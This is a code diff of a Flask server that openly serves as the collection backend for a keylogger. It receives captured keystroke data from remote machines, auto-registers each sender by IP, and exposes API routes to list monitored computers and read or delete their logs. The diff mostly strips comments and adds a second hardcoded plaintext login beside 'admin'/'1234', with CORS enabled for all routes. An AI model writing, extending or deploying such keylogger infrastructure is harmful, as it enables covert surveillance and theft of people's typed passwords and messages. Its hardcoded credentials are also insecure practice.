@@ -5,13 +5,12 @@ import json
 from datetime import datetime
 
 app = Flask(__name__)
-CORS(app)  # Enable CORS for all routes
+CORS(app)
 
-# Demo user credentials
-users = {"admin": "1234"}
+users = {"admin": "1234","yosi": "12@AS"}
 computers = []
 
-# Directory for storing keylogger data
+
 LISTEN_DIR = "listening_files"
 
 if not os.path.exists(LISTEN_DIR):
@@ -31,7 +30,6 @@ def login():
 
 @app.route('/api/computers', methods=['GET'])
 def get_computers():
-    # Add data availability flag for each computer
     for computer in computers:
         file_path = os.path.join(LISTEN_DIR, f"{computer['ip']}.log")
         computer['data'] = os.path.exists(file_path)
@@ -52,7 +50,6 @@ def add_computer():
     if not name or not ip:
         return jsonify({"success": False, "message": "נא למלא את כל השדות"}), 400
 
-    # Check if computer already exists
     for computer in computers:
         if computer['ip'] == ip:
             return jsonify({"success": False, "message": "מחשב עם IP זה כבר קיים במערכת"}), 400
@@ -75,7 +72,6 @@ def remove_computer(computer_ip):
     global computers
     computers = [computer for computer in computers if computer['ip'] != computer_ip]
 
-    # Also remove any keylogger data file
     file_path = os.path.join(LISTEN_DIR, f"{computer_ip}.log")
     if os.path.exists(file_path):
         os.remove(file_path)
@@ -118,13 +114,11 @@ def get_listening_data(computer_ip):
 def add_listening_data(computer_ip):
     data = request.json
 
-    # Update computer status if it exists
     computer = next((computer for computer in computers if computer['ip'] == computer_ip), None)
     if computer:
         computer['status'] = 'online'
         computer['lastActivity'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     else:
-        # Auto-register new computer if it doesn't exist
         new_computer = {
             "name": f"Computer-{computer_ip}",
             "ip": computer_ip,
@@ -134,7 +128,6 @@ def add_listening_data(computer_ip):
         }
         computers.append(new_computer)
 
-    # Save listening data
     file_path = os.path.join(LISTEN_DIR, f"{computer_ip}.log")
 
     try:
@@ -145,12 +138,10 @@ def add_listening_data(computer_ip):
                 except json.JSONDecodeError:
                     existing_data = {}
 
-            # Check if data is a dict or a list
             if isinstance(existing_data, dict):
                 existing_data.update(data)
             else:
-                # If existing_data is a list, we can't update it directly
-                # Convert both to lists and concat them
+
                 if isinstance(data, list):
                     existing_data.extend(data)
                 else:
@@ -162,7 +153,6 @@ def add_listening_data(computer_ip):
             with open(file_path, 'w') as file:
                 json.dump(data, file)
 
-        # Update last_modified if the computer exists
         if computer:
             computer['last_modified'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             computer['data'] = True
